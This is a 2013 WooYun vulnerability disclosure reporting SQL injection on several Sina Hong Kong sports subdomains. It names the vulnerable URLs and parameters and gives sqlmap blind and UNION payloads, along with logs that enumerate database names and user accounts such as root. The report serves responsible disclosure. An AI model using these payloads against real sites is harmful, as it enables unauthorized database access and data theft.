wybug_title: 新浪网多处SQL注射漏洞大礼包，均可读库
wybug_detail:
漏洞详情 披露状态：   									2013-04-03：	细节已通知厂商并且等待厂商处理中									2013-04-03：	厂商已经确认，细节仅向厂商公开									2013-04-13：	细节向核心白帽子及相关领域专家公开									2013-04-23：	细节向普通白帽子公开									2013-05-03：	细节向实习白帽子公开									2013-05-18：	细节向公众公开  简要描述： 新浪SQL盲注 详细说明：  1，http://soccer.sina.com.hk/cgi-bin/nw/focus.cgi?id=3 SQL盲注 太慢了 懒得跑了 
---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=3 AND 9875=9875---[20:41:32] [INFO] testing MySQL[20:41:35] [INFO] confirming MySQL[20:41:40] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL >= 5.0.0[20:41:40] [INFO] fetching database names[20:41:40] [INFO] fetching number of databases[20:41:40] [INFO] retrieved: 6[20:41:53] [INFO] retrieved: information_schema[20:46:45] [INFO] retrieved: live_soccer[20:50:13] [INFO] retrieved: mysql
2，http://basketball.sina.com.hk/cgi-bin/player/main.cgi?id=166 http://basketball.sina.com.hk/cgi-bin/stat/match.cgi?oid=8322  都存在 建议仔细查查这个站
[21:34:15] [INFO] testing MySQL[21:34:16] [INFO] confirming MySQL[21:34:19] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL < 5.0.0[21:34:19] [WARNING] information_schema not available, back-end DBMS is MySQL <5. database names will be fetched from 'mysql' database[21:34:19] [INFO] fetching database namesavailable databases [2]:[*] test[*] test\_%
3,http://sports.sina.com.hk/cgi-bin/nw/photo/main.cgi?cat=102    注射点 
Payload: cat=102 AND 4106=4106    Type: UNION query    Title: MySQL UNION query (NULL) - 1 to 10 columns    Payload: cat=-2946 UNION ALL SELECT CONCAT(CHAR(58,101,110,107,58),CHAR(112,69,72,77,70,90,72,71,115,88),CHAR(58,97,113,100,58))#---[22:28:37] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 4[22:28:37] [INFO] fetching database users[22:28:40] [INFO] the SQL query used returns 16 entriesdatabase management system users [8]:[*][*] hk[*] psauth[*] readonly[*] root[*] web[*] web_ro
   漏洞证明：  





   修复方案：  求公仔！！！   版权声明：转载请注明来源 iiiiiiiii@乌云
